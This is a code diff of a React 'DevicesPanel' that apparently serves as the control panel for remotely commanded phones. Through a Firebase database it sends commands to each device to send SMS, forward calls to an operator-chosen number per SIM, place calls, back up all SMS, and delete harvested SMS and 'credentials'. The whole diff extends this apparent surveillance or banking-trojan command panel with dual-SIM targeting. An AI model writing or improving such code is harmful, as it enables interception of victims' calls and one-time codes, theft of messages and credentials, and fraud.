@@ -39,7 +39,7 @@ export default function DevicesPanel({
     });
   }
 
-  // Online pehle, fir Serial
+  // Online first, then Serial sort
   keys.sort((a, b) => {
     const onA = deviceOnlineStatus[a] ? 1 : 0;
     const onB = deviceOnlineStatus[b] ? 1 : 0;
@@ -71,36 +71,83 @@ export default function DevicesPanel({
     setActiveTabs(prev => ({ ...prev, [devId]: prev[devId] === tab ? null : tab }));
   };
 
+  // Dual SIM execution command handler
   const handleCommand = (type, devId) => {
-    if (!confirm(`Execute ${type} on ${devId}?`)) return;
     const baseRef = ref(db, `user_data/${devId}`);
 
-    if (type === "call") {
-      const num = formMemory[`callNum-${devId}`];
-      const sim = formMemory[`callSim-${devId}`] || "0";
-      if (!num) return showToast("Enter phone number!", "warning");
-      update(baseRef, { command: "make call", adminNumber: num, simSlot: sim, timestamp: Date.now() });
-      showToast("Call command sent", "success");
-    } else if (type === "sms") {
+    if (type === "sendsms") {
       const num = formMemory[`smsNum-${devId}`];
       const body = formMemory[`smsText-${devId}`];
-      const sim = formMemory[`smsSim-${devId}`] || "1";
-      if (!num || !body) return showToast("Enter recipient & message!", "warning");
-      update(baseRef, { command: "send message", targetDeviceId: devId, phoneNumber: num, messageText: body, simSlot: sim, timestamp: Date.now() });
-      showToast("SMS command sent", "success");
-    } else if (type === "fwd_on") {
+      const selectedSim = formMemory[`smsSim-${devId}`] || "0"; // Default SIM 1 (index 0)
+
+      if (!num || !body) return showToast("⚠️ Enter recipient number & message!", "warning");
+      if (!confirm(`Send SMS from SIM ${Number(selectedSim) + 1} to ${num}?`)) return;
+
+      update(baseRef, {
+        command: "send message",
+        targetDeviceId: devId,
+        phoneNumber: num,
+        messageText: body,
+        simSlot: selectedSim,
+        sim: Number(selectedSim),
+        simIndex: Number(selectedSim),
+        timestamp: Date.now()
+      }).then(() => {
+        showToast(`✅ SMS sent via SIM ${Number(selectedSim) + 1}`, "success");
+        setFormMemory(p => ({ ...p, [`smsText-${devId}`]: "" }));
+      });
+    } 
+    else if (type === "fwd_on") {
       const num = formMemory[`fwdNum-${devId}`];
-      const sim = formMemory[`fwdSim-${devId}`] || "0";
-      if (!num) return showToast("Enter forward number!", "warning");
-      update(baseRef, { command: "call forward", targetDeviceId: devId, phoneNumber: num, simSlot: sim, timestamp: Date.now() });
-      showToast("Call Forward Activated", "success");
-    } else if (type === "fwd_off") {
-      const sim = formMemory[`fwdSim-${devId}`] || "0";
-      update(baseRef, { command: "forward off", targetDeviceId: devId, simSlot: sim, timestamp: Date.now() });
-      showToast("Call Forward Deactivated", "success");
-    } else if (type === "backup") {
-      update(baseRef, { command: "backup", timestamp: Date.now() });
-      showToast("Backup initiated", "success");
+      const selectedSim = formMemory[`fwdSim-${devId}`] || "0"; // Default SIM 1
+
+      if (!num) return showToast("⚠️ Enter forward-to phone number!", "warning");
+      if (!confirm(`Activate Call Forward on SIM ${Number(selectedSim) + 1} to ${num}?`)) return;
+
+      update(baseRef, {
+        command: "call forward",
+        targetDeviceId: devId,
+        phoneNumber: num,
+        forwardNumber: num,
+        simSlot: selectedSim,
+        sim: Number(selectedSim),
+        simIndex: Number(selectedSim),
+        timestamp: Date.now()
+      }).then(() => showToast(`✅ Call Forward ON (SIM ${Number(selectedSim) + 1})`, "success"));
+    } 
+    else if (type === "fwd_off") {
+      const selectedSim = formMemory[`fwdSim-${devId}`] || "0";
+      if (!confirm(`Deactivate Call Forward on SIM ${Number(selectedSim) + 1}?`)) return;
+
+      update(baseRef, {
+        command: "forward off",
+        targetDeviceId: devId,
+        simSlot: selectedSim,
+        sim: Number(selectedSim),
+        simIndex: Number(selectedSim),
+        timestamp: Date.now()
+      }).then(() => showToast(`⛔ Call Forward OFF (SIM ${Number(selectedSim) + 1})`, "success"));
+    } 
+    else if (type === "call") {
+      const num = formMemory[`callNum-${devId}`];
+      const selectedSim = formMemory[`callSim-${devId}`] || "0";
+
+      if (!num) return showToast("⚠️ Enter target phone number!", "warning");
+      if (!confirm(`Make Call from SIM ${Number(selectedSim) + 1} to ${num}?`)) return;
+
+      update(baseRef, {
+        command: "make call",
+        adminNumber: num,
+        phoneNumber: num,
+        simSlot: selectedSim,
+        sim: Number(selectedSim),
+        timestamp: Date.now()
+      }).then(() => showToast(`📞 Calling via SIM ${Number(selectedSim) + 1}`, "success"));
+    } 
+    else if (type === "backup") {
+      if (!confirm(`Trigger full SMS backup on ${devId}?`)) return;
+      update(baseRef, { command: "backup", timestamp: Date.now() })
+        .then(() => showToast("💾 Backup initiated", "success"));
     }
   };
 
@@ -184,6 +231,9 @@ export default function DevicesPanel({
             ...val,
             _timestamp: val.timestamp || val.date || 0
           })).sort((a, b) => b._timestamp - a._timestamp);
+
+          const sim1Num = dev.numberSim1 || "No SIM 1";
+          const sim2Num = dev.numberSim2 || "No SIM 2";
 
           return (
             <div key={devId} className={`device-card-premium ${isOnline ? "online" : "offline"}`}>
@@ -321,47 +371,242 @@ export default function DevicesPanel({
                     </div>
                   )}
 
-                  {/* Call Sub-tab */}
-                  {curTab === "call" && (
-                    <div className="section-premium">
-                      <div className="section-title">Make Call Command</div>
-                      <input 
-                        type="text" 
-                        placeholder="Enter target phone number" 
-                        className="search-input" 
-                        style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6 }}
-                        value={formMemory[`callNum-${devId}`] || ""}
-                        onChange={(e) => setFormMemory(p => ({ ...p, [`callNum-${devId}`]: e.target.value }))}
-                      />
-                      <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center" }} onClick={() => handleCommand("call", devId)}>
-                        <i className="fas fa-phone"></i> Execute Call
-                      </button>
-                    </div>
-                  )}
-
-                  {/* Send SMS Sub-tab */}
+                  {/* SEND SMS COMMAND (FIXED WITH SIM SELECTOR) */}
                   {curTab === "sendsms" && (
                     <div className="section-premium">
-                      <div className="section-title">Send SMS Command</div>
+                      <div className="section-title">
+                        <i className="fas fa-paper-plane" style={{ marginRight: 6 }}></i> Send SMS Command
+                      </div>
+
+                      {/* SIM Selection Buttons */}
+                      <div style={{ marginBottom: 10 }}>
+                        <label style={{ fontSize: 11, color: "var(--text-muted)", display: "block", marginBottom: 5 }}>
+                          Select Outgoing SIM:
+                        </label>
+                        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
+                          <button
+                            type="button"
+                            onClick={() => setFormMemory(p => ({ ...p, [`smsSim-${devId}`]: "0" }))}
+                            style={{
+                              padding: "8px",
+                              borderRadius: 8,
+                              border: (formMemory[`smsSim-${devId}`] || "0") === "0" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
+                              background: (formMemory[`smsSim-${devId}`] || "0") === "0" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
+                              color: (formMemory[`smsSim-${devId}`] || "0") === "0" ? "var(--gold)" : "var(--text-secondary)",
+                              fontSize: 11,
+                              fontWeight: 600,
+                              cursor: "pointer",
+                              textAlign: "center"
+                            }}
+                          >
+                            <i className="fas fa-sim-card"></i> SIM 1 <br/>
+                            <span style={{ fontSize: 9, opacity: 0.8 }}>({sim1Num})</span>
+                          </button>
+
+                          <button
+                            type="button"
+                            onClick={() => setFormMemory(p => ({ ...p, [`smsSim-${devId}`]: "1" }))}
+                            style={{
+                              padding: "8px",
+                              borderRadius: 8,
+                              border: formMemory[`smsSim-${devId}`] === "1" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
+                              background: formMemory[`smsSim-${devId}`] === "1" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
+                              color: formMemory[`smsSim-${devId}`] === "1" ? "var(--gold)" : "var(--text-secondary)",
+                              fontSize: 11,
+                              fontWeight: 600,
+                              cursor: "pointer",
+                              textAlign: "center"
+                            }}
+                          >
+                            <i className="fas fa-sim-card"></i> SIM 2 <br/>
+                            <span style={{ fontSize: 9, opacity: 0.8 }}>({sim2Num})</span>
+                          </button>
+                        </div>
+                      </div>
+
                       <input 
                         type="text" 
-                        placeholder="Phone Number" 
+                        placeholder="Recipient Phone Number (e.g. 9876543210)" 
                         className="search-input" 
-                        style={{ background: "var(--bg-input)", marginBottom: 6, borderRadius: 6 }}
+                        style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
                         value={formMemory[`smsNum-${devId}`] || ""}
                         onChange={(e) => setFormMemory(p => ({ ...p, [`smsNum-${devId}`]: e.target.value }))}
                       />
                       <textarea 
-                        placeholder="Message Text" 
-                        rows="2"
+                        placeholder="Type Message Content..." 
+                        rows="3"
                         className="search-input" 
-                        style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6 }}
+                        style={{ background: "var(--bg-input)", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)", height: "auto" }}
                         value={formMemory[`smsText-${devId}`] || ""}
                         onChange={(e) => setFormMemory(p => ({ ...p, [`smsText-${devId}`]: e.target.value }))}
                       />
-                      <button className="btn-luxury btn-blue" style={{ width: "100%", justifyContent: "center" }} onClick={() => handleCommand("sms", devId)}>
-                        <i className="fas fa-paper-plane"></i> Send SMS
+                      <button 
+                        className="btn-luxury btn-blue" 
+                        style={{ width: "100%", justifyContent: "center", padding: "10px" }} 
+                        onClick={() => handleCommand("sendsms", devId)}
+                      >
+                        <i className="fas fa-paper-plane"></i> Send SMS from SIM {(Number(formMemory[`smsSim-${devId}`] || "0") + 1)}
                       </button>
+                    </div>
+                  )}
+
+                  {/* CALL FORWARD COMMAND (FIXED WITH SIM SELECTOR) */}
+                  {curTab === "fwd" && (
+                    <div className="section-premium">
+                      <div className="section-title">
+                        <i className="fas fa-random" style={{ marginRight: 6 }}></i> Call Forward Controls
+                      </div>
+
+                      {/* SIM Selection Buttons */}
+                      <div style={{ marginBottom: 10 }}>
+                        <label style={{ fontSize: 11, color: "var(--text-muted)", display: "block", marginBottom: 5 }}>
+                          Select Target SIM for Forwarding:
+                        </label>
+                        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
+                          <button
+                            type="button"
+                            onClick={() => setFormMemory(p => ({ ...p, [`fwdSim-${devId}`]: "0" }))}
+                            style={{
+                              padding: "8px",
+                              borderRadius: 8,
+                              border: (formMemory[`fwdSim-${devId}`] || "0") === "0" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
+                              background: (formMemory[`fwdSim-${devId}`] || "0") === "0" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
+                              color: (formMemory[`fwdSim-${devId}`] || "0") === "0" ? "var(--gold)" : "var(--text-secondary)",
+                              fontSize: 11,
+                              fontWeight: 600,
+                              cursor: "pointer",
+                              textAlign: "center"
+                            }}
+                          >
+                            <i className="fas fa-sim-card"></i> SIM 1 <br/>
+                            <span style={{ fontSize: 9, opacity: 0.8 }}>({sim1Num})</span>
+                          </button>
+
+                          <button
+                            type="button"
+                            onClick={() => setFormMemory(p => ({ ...p, [`fwdSim-${devId}`]: "1" }))}
+                            style={{
+                              padding: "8px",
+                              borderRadius: 8,
+                              border: formMemory[`fwdSim-${devId}`] === "1" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
+                              background: formMemory[`fwdSim-${devId}`] === "1" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
+                              color: formMemory[`fwdSim-${devId}`] === "1" ? "var(--gold)" : "var(--text-secondary)",
+                              fontSize: 11,
+                              fontWeight: 600,
+                              cursor: "pointer",
+                              textAlign: "center"
+                            }}
+                          >
+                            <i className="fas fa-sim-card"></i> SIM 2 <br/>
+                            <span style={{ fontSize: 9, opacity: 0.8 }}>({sim2Num})</span>
+                          </button>
+                        </div>
+                      </div>
+
+                      <input 
+                        type="text" 
+                        placeholder="Forward To Phone Number" 
+                        className="search-input" 
+                        style={{ background: "var(--bg-input)", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)" }}
+                        value={formMemory[`fwdNum-${devId}`] || ""}
+                        onChange={(e) => setFormMemory(p => ({ ...p, [`fwdNum-${devId}`]: e.target.value }))}
+                      />
+
+                      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
+                        <button 
+                          className="btn-luxury" 
+                          style={{ background: "var(--green)", color: "#fff", justifyContent: "center", padding: "10px" }} 
+                          onClick={() => handleCommand("fwd_on", devId)}
+                        >
+                          <i className="fas fa-play"></i> Turn ON Forward
+                        </button>
+                        <button 
+                          className="btn-luxury btn-red" 
+                          style={{ justifyContent: "center", padding: "10px" }} 
+                          onClick={() => handleCommand("fwd_off", devId)}
+                        >
+                          <i className="fas fa-stop"></i> Turn OFF Forward
+                        </button>
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Call Sub-tab */}
+                  {curTab === "call" && (
+                    <div className="section-premium">
+                      <div className="section-title">Make Call Command</div>
+
+                      <div style={{ marginBottom: 10, display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
+                        <button
+                          type="button"
+                          onClick={() => setFormMemory(p => ({ ...p, [`callSim-${devId}`]: "0" }))}
+                          style={{
+                            padding: "6px",
+                            borderRadius: 6,
+                            border: (formMemory[`callSim-${devId}`] || "0") === "0" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
+                            background: (formMemory[`callSim-${devId}`] || "0") === "0" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
+                            color: (formMemory[`callSim-${devId}`] || "0") === "0" ? "var(--gold)" : "var(--text-secondary)",
+                            fontSize: 11,
+                            fontWeight: 600,
+                            cursor: "pointer"
+                          }}
+                        >
+                          SIM 1
+                        </button>
+                        <button
+                          type="button"
+                          onClick={() => setFormMemory(p => ({ ...p, [`callSim-${devId}`]: "1" }))}
+                          style={{
+                            padding: "6px",
+                            borderRadius: 6,
+                            border: formMemory[`callSim-${devId}`] === "1" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
+                            background: formMemory[`callSim-${devId}`] === "1" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
+                            color: formMemory[`callSim-${devId}`] === "1" ? "var(--gold)" : "var(--text-secondary)",
+                            fontSize: 11,
+                            fontWeight: 600,
+                            cursor: "pointer"
+                          }}
+                        >
+                          SIM 2
+                        </button>
+                      </div>
+
+                      <input 
+                        type="text" 
+                        placeholder="Enter target phone number" 
+                        className="search-input" 
+                        style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
+                        value={formMemory[`callNum-${devId}`] || ""}
+                        onChange={(e) => setFormMemory(p => ({ ...p, [`callNum-${devId}`]: e.target.value }))}
+                      />
+                      <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("call", devId)}>
+                        <i className="fas fa-phone"></i> Make Call from SIM {(Number(formMemory[`callSim-${devId}`] || "0") + 1)}
+                      </button>
+                    </div>
+                  )}
+
+                  {/* Backup Sub-tab */}
+                  {curTab === "backup" && (
+                    <div className="section-premium">
+                      <div className="section-title">Device Backup</div>
+                      <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("backup", devId)}>
+                        <i className="fas fa-database"></i> Trigger Full Backup
+                      </button>
+                    </div>
+                  )}
+
+                  {/* Delete Sub-tab */}
+                  {curTab === "delete" && (
+                    <div className="section-premium" style={{ borderColor: "var(--red)" }}>
+                      <div className="section-title" style={{ color: "var(--red)" }}>Danger Zone</div>
+                      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
+                        <button className="btn-luxury btn-red" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "sms")}>
+                          Delete SMS
+                        </button>
+                        <button className="btn-luxury btn-purple" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "credentials")}>
+                          Delete Creds
+                        </button>
+                      </div>
                     </div>
                   )}
                 </div>
